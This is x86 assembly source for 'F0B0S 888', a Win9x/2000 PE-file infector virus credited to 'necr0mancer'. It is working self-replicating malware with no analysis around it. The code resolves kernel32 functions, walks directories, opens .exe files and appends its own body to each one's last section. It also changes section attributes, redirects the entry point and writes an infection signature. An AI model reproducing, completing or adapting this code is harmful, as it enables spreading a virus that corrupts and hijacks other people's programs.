;Win9x/2k simple pe-infector
;
;             (c) necr0mancer

include  kernel32.inc
include  win.inc


includelib INC\import32.lib           ;(for message)
extrn	MessageBoxA:near


        .386
        .model flat

        .data

	      dd  00
message_title db 'F0B0S information',0

message       db 'F0B0S 888 has started.',0dh,0dh
              db 'Copyleft (c) 2001 necromancer.',0dh
              db 'Have a nice day!',0
        .code

Original:
       push MB_ICONEXCLAMATION
       push offset message_title
       push offset message
       push 0
       call MessageBoxA

       push    0
       call ExitProcess                               ; call    ExitProcess


_start:                                              
        call GetSuber
GetSuber:
     
        pop ebp
        sub ebp,offset GetSuber
                                                     
        mov eax,[ebp+OldRVA]
        add eax,[ebp+imagebase]
        push eax  			             ;FOR returning in prog

        mov esi,[ebp+imagebase]                      ;esi=imagebase
        cmp word ptr[esi],'ZM'
        jne no_yet

        mov eax,[esi+3ch]
        add eax,esi                                  ;PE-header

        mov ebx,[eax+80h]
        add ebx,esi                                  ;import table

s_cycle:

        mov ecx,[ebx+0ch]
        cmp 4 ptr ecx,0
        je  no_yet

        add ecx,esi                                  ;correct

        cmp 4 ptr [ecx],'NREK'
        jne s_next

        cmp 4 ptr [ecx+4],'23LE'
        je finded

s_next:
        add ebx,14h
        jmp s_cycle
finded:

        mov eax,[ebx]                                ;adress of switches table
        cmp eax,0			             ;fuck- it is programs
        je  no_yet                                   ;writen by suckers:E

        add eax,esi                                  ;correct

        xor ecx,ecx
        xchg esi,edx                                 ;edx=esi (for cmpsb)

GMH_find:
        mov esi,[eax]                                ;switch->descryptor
        cmp 4 ptr [eax],0                            ;null descryptor?
        je no_yet

        add esi,edx                                  ;correct
        inc esi                                      ;add esi,2
        inc esi

        push ecx
        mov ecx,16                                   ;length of GetM....
        lea edi,[ebp+offset Gmh]
        repe cmpsb
        pop ecx
        jz GMH_finded                                ;YESSS!

        add ecx,4                                    ;no...
        add eax,4
        jmp GMH_find                                 ;next

GMH_finded:

       mov eax,[ebx+10h]                             ;System corrected adresses
       add eax,edx                                   ;corrrect
       add eax,ecx                                   ;GetModuleHandleA

       mov eax,[eax]
       lea ecx,[ebp+offset kernel]
       push ecx
       call eax
                                                     ;calling GetModuleHandleA
                                                     ;for kernel32.dll
       cmp eax,0
       je no_yet                                     ;EAX=offset Kernel32.dll

       mov [ebp+kernelAdr],eax

no_yet:


;0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0

       lea esi,[ebp+offset _Table]
       lea ebx,[ebp+offset _adr]

Ft_repeat:

       mov edi,esi
       call get_proc_adr

       cmp eax,0
       je  end_Ft_cycle

       mov [ebx],eax
       add ebx,4

Ft_cycle:
       lodsb
       cmp al,0ffh
       je  end_Ft_cycle

       cmp al,0
       jne Ft_cycle

       jmp Ft_repeat

end_Ft_cycle:

       lea eax,[ebp+offset curdir]
       push eax
       push 260
       call [ebp+GetCurrentDirectory]

       xor eax,eax                                
       mov [ebp+DirNum],al 	      	             ;Nulling count of
       mov [ebp+FileNum],al 	                     ;scaned files & dirs

       lea edi,[ebp+offset SearchRec]
       lea edx,[ebp+offset curdir]
       call filefind

       retn                                          ;Return on original
                                                     ;entry point

;=========================================================================================
;Input: edi=offset of string

get_proc_adr       proc

       pushad

       mov ebx,[ebp+kernelAdr]

       mov ecx,[ebx+3ch]
       add ecx,ebx

       mov ecx,[ecx+78h]
       jecxz return_0

       add ecx,ebx                                   ;ecx-offset of export table

       xor esi,esi

_search:

       mov edx,[ecx+20h]                             ;offsets on Strings
       add edx,ebx                                   ;correct

       mov edx,[edx+esi*4]
       add edx,ebx

       push edi

_compare_strings:

       mov al,[edx]
       cmp al,[edi]
       jne _exit_compare

       or al,al
       jz  _exit_compare

       inc edi
       inc edx
       jmp _compare_strings

_exit_compare:

       pop  edi
       je _name_found

       inc esi
       cmp esi,[ecx+18h]
       jb _search

return_0:

       xor eax,eax
       jmp _return

_name_found:
                                                     ;esi=index on string table

       mov edx,[ecx+24h]
       add edx,ebx
       movzx edx, word ptr [edx+esi*2]

       mov eax,[ecx+1ch]
       add eax,ebx                                   ;correct

       mov eax,[eax+edx*4]
       add eax,ebx

_return:

       mov [esp+7*4],eax

       popad
       retn

get_proc_adr       endp


;-------------------------------
;Input:edx=offset of filename

fopen  proc

       pushad

       push 0
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push 0
       push FILE_SHARE_READ + FILE_SHARE_WRITE
       push GENERIC_READ + GENERIC_WRITE
       push edx
       call [ebp+CreateFile]

       cmp eax,-1
       je fo_error

       mov [esp+7*4], eax
       popad
       retn

fo_error:
       xor eax,eax
       mov [esp+7*4], eax

       popad
       retn
fopen  endp


;-------------------------------
;Input:ebx=handle

fclose proc

       pushad

       push ebx
       call [ebp+CloseHandle]

       popad
       retn
fclose endp


;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to read
;      edx=offset of bufer
;      ebx=handle to file

fread  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread]
       push eax

       push ecx
       push edx
       push ebx
       call [ebp+ReadFile]

       popad
       retn
fread  endp



;-------------------------------
;Input  : ebx=file handle
;Output : eax=size of file
fsize  proc

       pushad

       push 0
       push ebx
       call [ebp+GetFileSize]

       mov [esp+7*4],eax

       popad
       retn
fsize  endp


;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to move

fseek  proc

       pushad

       push FILE_BEGIN
       push 0
       push ecx
       push ebx
       call [ebp+SetFilePointer]

       popad
       retn
fseek  endp



;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to write
;      edi=offset of bufer

fwrite  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread]
       push eax

       push ecx
       push edi

       push ebx
       call [ebp+WriteFile]

       popad
       retn
fwrite  endp



;----------------------------------------------------------------------------------
;Input : edi=SearchRec structure
;        edx=dirname

filefind  proc
       pushad

       sub   esp,1024                ;for full directory name

       mov esi,edx		     ;offset of dirname 	
       mov edi,esp                   ;memory for FULL dirname

_scopy:
       lodsb
       stosb
       or al,al
       jnz _scopy

       dec edi

       mov al,'\'
       cmp [edi-1],al
       je _estislesh
       stosb

       mov esi,edi		     ;position for file/dir	

_estislesh:
 
       mov eax,'*.*'
       stosd
       mov eax,esp
 
       mov edi,[esp+1024]            ;restore edi
       push  edi

       push  eax

       call  [ebp+FindFirstFile]     ;eax=handle for search

       cmp   eax,-1                  ;if exist anybody?
       je    ff_quit

       xchg  ebx,eax		     ;search handle

ff_infect:

       pusha
       xchg esi,edi                  ;edi=position of file/dir esi=ff_struc
       lea esi,[esi].ff_fullname     ;esi=finded name
_sadd:
       lodsb                         ;string add
       stosb
       or al,al
       jnz _sadd
       popa

       mov edx,esp                   ;FULL name of file/dir

       test  byte ptr [edi].ff_attr, 16
       jnz   ff_dir                  ;dir?

       call  infect                  ;no dir,infect
       jmp ff_next

ff_dir:
       cmp  byte ptr [edi].ff_fullname,'.' 
       je   ff_next

       call filefind

       lea eax,[ebp+DirNum]
       inc byte ptr [eax]
       cmp byte ptr [eax],10
       ja ff_quit

ff_next:

       push edi
       push ebx
       call [ebp+FindNextFile]

       cmp  eax,0
       jne   ff_infect

ff_quit:

       push ebx
       call [ebp+FindClose]

       add esp,1024

       popad
       retn
filefind  endp

;=====================================================
;Input: edx=offset of full finded name

infect  proc
       pushad


       cmp byte ptr [ebp+FileNum],15
       ja no_EXE                    ;More than 15 files?
 
       mov esi,edx                  ;esi=edx=full name

_findzero:
       lodsb                         
       or al,al
       jnz _findzero
                                     ;esi=offset of null byte+1
       mov eax,[esi-4]

       cmp eax,00455845h	     ;EXE?
       je _gogo

       cmp eax,00657865h	     ;exe?
       jne no_EXE


_gogo:
       push edx

       push 100000                   ;100 kb
       push GMEM_FIXED
       call [ebp+GlobalAlloc]        ;eax=offset of getted memory

       mov [ebp+mem],eax             ;save handle

       pop edx
       call fopen

       cmp eax,0
       je i_close_exit

       xchg eax,ebx                  ;ebx=handle

       call fsize
       cmp eax,9000                  ;8 kb> ne idet
       jb  i_close_exit

       mov ecx,90000                 ;90 kb(Хай буде ;))
       mov edx,[ebp+mem]
       call fread

;-----------------------------------------------
       movzx eax,word ptr [edx+18h]
       cmp eax,40h
       jne i_close_exit

       mov eax,[edx+3ch]
       add edx,eax                   ;EDX=offset of PE header
       mov eax,[edx]
       cmp eax,00004550h             ;PE00
       jne i_close_exit

       cmp word ptr [edx+16h],2000h  ;DLL (in EXE? :/)
       je i_close_exit               

       cmp word ptr[edx+28h],0       ;RVA=0?
       je i_close_exit               

       cmp word ptr[edx+80h],0       ;Import table present?
       je i_close_exit               

       cmp 4 ptr [edx+08h],0F0B05888h  
       je i_close_exit               ;signature FOBOS-888;)

;------------------------------------------------

       movzx eax,word ptr[edx+14h]   ;NT header size
       add eax,18h                   ;Size of PE-header
       add eax,edx                   ;Eax=offset of Object table

       push eax
       push edx

       movzx eax,word ptr[edx+06h]   ;Number of objects 

       dec eax
       mov esi,40                    ;size of table

       mul esi                       ;result in EDX:EAX

       xchg esi,eax                  ;ESI=offset of last object

       pop edx
       pop eax

       add esi,eax                   ;correct(esi=last object)
       mov eax,[esi+8h]              ;Vsize

       mov edi,[esi+10h]             ;Fsize
       mov [ebp+Fsize],edi

       cmp eax,0
       je i_close_exit

       cmp edi,0
       je i_close_exit

       cmp eax,edi                   ;Vsize<Fsize
       jb i_close_exit

       mov eax,[esi+14h]             ;Foffset
       mov [ebp+Foff],eax

       mov eax,[esi+0Ch]             ;Voffset
       mov [ebp+Voff],eax            ;eax,edi,ecx 

       mov ecx,[edx+28h]     
       mov [ebp+OldRVA],ecx
                             
       add eax,[ebp+Fsize]           ;eax=virtual offset+physic size=new RVA
       mov [edx+28h],eax	     ;set RVA

       mov ecx,[edx+38h]             ;Virtual aligment
       mov eax,offset _endvbody-offset _start

       call Round
       add  [esi+08h],eax            ;Add virus size to section

       mov ecx,[edx+3Ch]             ;Physical aligment
       mov eax,offset _fbodyend-offset _start

       call Round
       add  [esi+10h],eax            ;Add virus size
       push eax			     ;for fwrite

       mov  eax,[esi+08h]             

       mov ecx,[ebp+Voff]            ;Virtual offset+virtualsize
       add ecx,eax
       mov [edx+50h],ecx             ;Correct imageSize

       mov ecx,[edx+34h]
       mov [ebp+imagebase],ecx

       mov [esi+24h],0E0000020h      ;attributes

       mov [edx+08h],0F0B05888h      ;signature FOBOS-888;)

;-----------------------------------------------
       xor ecx,ecx
       call fseek
;-----------------------------------------------

       mov ecx,[edx+54h]
       mov edi,[ebp+mem]
       call fwrite
 
;-----------------------------------------------

       mov ecx,[ebp+Foff]
       add ecx,[ebp+Fsize]           ;Offset of end of last section

       call fseek

       pop ecx
       lea edi,[ebp+offset _start]

       call fwrite

i_close_exit:

       call fclose

       mov eax,[ebp+mem]
       push eax
       call [ebp+GlobalFree]

       inc byte ptr [ebp+FileNum]
no_EXE:
       popad
       retn
infect  endp


;------------------------------------
;Input:ecx=field of rounding
;      eax=size
 
Round   proc
        pushad

        bsr ecx,eax                                  ;Scan backward for bit

        dec ecx

        shr eax,cl
        inc eax
        shl eax,cl

        mov [esp+7*4],eax                            ;Save for Output

        popad 
        retn
Round   endp


;----------------------------------data

imagebase      dd 00400000h

kernel         db 'KERNEL32.DLL',0
Gmh            db 'GetModuleHandleA',0

_Table:

               db 'CreateFileA',0
               db 'CloseHandle',0
               db 'ReadFile',0
               db 'GetFileSize',0

               db 'FindFirstFileA',0
               db 'FindNextFileA',0
               db 'FindClose',0
               db 'GlobalAlloc',0
               db 'GlobalFree',0
               db 'SetFilePointer',0
               db 'WriteFile',0
               db 'GetCurrentDirectoryA',0

its_over       db 0FFh

OldRVA         dd (offset Original-00400000h)
fmask          db '*.exe',0
dot            db '..',0

_fbodyend:

_adr:

CreateFile     dd ?           ;2
CloseHandle    dd ?           ;3
ReadFile       dd ?           ;4
GetFileSize    dd ?           ;5
FindFirstFile  dd ?           ;6
FindNextFile   dd ?           ;7
FindClose      dd ?           ;8
GlobalAlloc    dd ?           ;9
GlobalFree     dd ?           ;a
SetFilePointer dd ?           ;b
WriteFile      dd ?           ;c
GetCurrentDirectory  dd ?     ;d
;-------------------------------------

bytesread      dd ?
kernelAdr      dd ?
mem            dd ?


;--------------------PE---------------
Fsize	       dd ?
Voff 	       dd ?
Foff           dd ?  

curdir         db 260 dup (?)
SearchRec      f_struc<,,,,,,,>

DirNum         db ?
FileNum        db ? 
_endvbody:



end     _start